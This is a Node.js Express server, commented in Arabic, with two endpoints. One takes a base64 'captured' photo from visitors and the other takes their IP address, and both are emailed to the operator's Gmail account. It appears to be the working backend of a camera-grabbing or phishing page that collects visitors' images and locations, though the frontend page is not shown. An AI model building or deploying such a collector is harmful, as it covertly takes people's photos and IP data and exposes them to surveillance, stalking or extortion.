const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json({ limit: '10mb' }));

// إرسال الصورة بالإيميل
app.post('/upload', async (req, res) => {
  const image = req.body.image;

  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  let mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.GMAIL_USER,
    subject: 'New Photo Captured',
    html: '<p>Attached image from site.</p>',
    attachments: [{
      filename: 'photo.png',
      content: image.split("base64,")[1],
      encoding: 'base64'
    }]
  };

  try {
    await transporter.sendMail(mailOptions);
    res.sendStatus(200);
  } catch (error) {
    console.error('Email error:', error);
    res.sendStatus(500);
  }
});

// إرسال الـ IP بالإيميل
app.post('/send-ip', async (req, res) => {
  const ip = req.body.ip || 'unknown';

  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  let mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.GMAIL_USER,
    subject: 'Visitor IP Address',
    text: `New visitor IP: ${ip}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.sendStatus(200);
  } catch (error) {
    console.error('Email error:', error);
    res.sendStatus(500);
  }
});

// خدمة الملفات الثابتة (index.html وغيره)
app.use(express.static(__dirname));

// تشغيل السيرفر على البورت المحدد من البيئة أو 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
